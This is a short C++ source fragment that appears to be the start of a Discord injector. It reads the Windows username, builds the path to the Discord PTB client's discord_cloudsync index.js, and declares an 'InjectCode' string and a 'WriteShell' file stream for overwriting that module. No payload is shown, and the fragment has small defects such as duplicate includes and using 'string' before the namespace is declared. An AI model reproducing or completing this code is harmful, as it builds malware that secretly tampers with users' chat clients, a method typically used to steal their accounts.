#include <iostream>
#include <string>
#include <vector>
#include "windows.h"
#include "shell.h"
#include <regex>
#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <direct.h>
#include <random>
char* GrabCurrentUsernameLOL= getenv("username");
std::string InjectCode;
std::string path = "C:\\Users\\" + string(GrabCurrentUsernameLOL) + "\\AppData\\Local\\DiscordPTB\\app - 1.0.1008\\modules\\discord_cloudsync - 1\\discord_cloudsync\\index.js";
std::ofstream WriteShell;
using namespace std;